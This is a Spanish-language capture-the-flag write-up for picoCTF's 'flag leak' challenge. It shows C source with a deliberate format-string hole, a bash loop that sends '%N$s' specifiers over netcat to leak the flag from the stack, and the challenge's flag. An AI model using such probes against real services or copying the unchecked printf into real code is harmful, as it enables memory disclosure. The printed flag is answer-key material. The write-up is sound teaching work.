# flag leak

## Descripción

Story telling class 1/2I'm just copying and pasting with this [program](https://artifacts.picoctf.net/c/93/vuln). What can go wrong? You can view source [here](https://artifacts.picoctf.net/c/93/vuln.c). And connect with it using:`nc saturn.picoctf.net 50261`

## Pistas

Format Strings

## Solución

```
┌──(kali㉿kali)-[~/picoctf/binaryexplotation/flagleak]
└─$ wget https://artifacts.picoctf.net/c/91/vuln  
--2023-05-19 22:37:42--  https://artifacts.picoctf.net/c/91/vuln
Resolving artifacts.picoctf.net (artifacts.picoctf.net)... 18.154.144.104, 18.154.144.107, 18.154.144.103, ...
Connecting to artifacts.picoctf.net (artifacts.picoctf.net)|18.154.144.104|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 15876 (16K) [application/octet-stream]
Saving to: ‘vuln’

vuln                              100%[=============================================================>]  15.50K  --.-KB/s    in 0.02s   

2023-05-19 22:37:42 (698 KB/s) - ‘vuln’ saved [15876/15876]

                                                                                                                                        
┌──(kali㉿kali)-[~/picoctf/binaryexplotation/flagleak]
└─$ wget https://artifacts.picoctf.net/c/91/vuln.c
--2023-05-19 22:37:52--  https://artifacts.picoctf.net/c/91/vuln.c
Resolving artifacts.picoctf.net (artifacts.picoctf.net)... 18.154.144.85, 18.154.144.104, 18.154.144.107, ...
Connecting to artifacts.picoctf.net (artifacts.picoctf.net)|18.154.144.85|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 947 [application/octet-stream]
Saving to: ‘vuln.c’

vuln.c                            100%[=============================================================>]     947  --.-KB/s    in 0s      

2023-05-19 22:37:53 (34.4 MB/s) - ‘vuln.c’ saved [947/947]


┌──(kali㉿kali)-[~/picoctf/binaryexplotation/flagleak]
└─$ cat vuln.c       
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <wchar.h>
#include <locale.h>

#define BUFSIZE 64
#define FLAGSIZE 64

void readflag(char* buf, size_t len) {
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("%s %s", "Please create 'flag.txt' in this directory with your",
                    "own debugging flag.\n");
    exit(0);
  }

  fgets(buf,len,f); // size bound read
}

void vuln(){
   char flag[BUFSIZE];
   char story[128];

   readflag(flag, FLAGSIZE);

   printf("Tell me a story and then I'll tell you one >> ");
   scanf("%127s", story);
   printf("Here's a story - \n");
   printf(story);
   printf("\n");
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  
  // Set the gid to the effective gid
  // this prevents /bin/sh from dropping the privileges
  gid_t gid = getegid();
  setresgid(gid, gid, gid);
  vuln();
  return 0;
}


┌──(kali㉿kali)-[~/picoctf/binaryexplotation/flagleak]
└─$ for i in {0..999}; do echo "%$i\$s" | nc saturn.picoctf.net 63256 | grep -Ei pico; done
FLAG=picoCTF{L34k1ng_Fl4g_0ff_St4ck_

┌──(kali㉿kali)-[~/picoctf/binaryexplotation/flagleak]
└─$ for i in {0..999}; do echo "%$i\$s" | nc saturn.picoctf.net 63256 | grep -Ei (pico|ctf); done
CTF{L34k1ng_Fl4g_0ff_St4ck_64bf08ef}
```

## Bandera

picoCTF{L34k1ng_Fl4g_0ff_St4ck_64bf08ef}

## Notas adicionales



## Referencias
- https://artifacts.picoctf.net/c/93/vuln
- https://artifacts.picoctf.net/c/93/vuln.c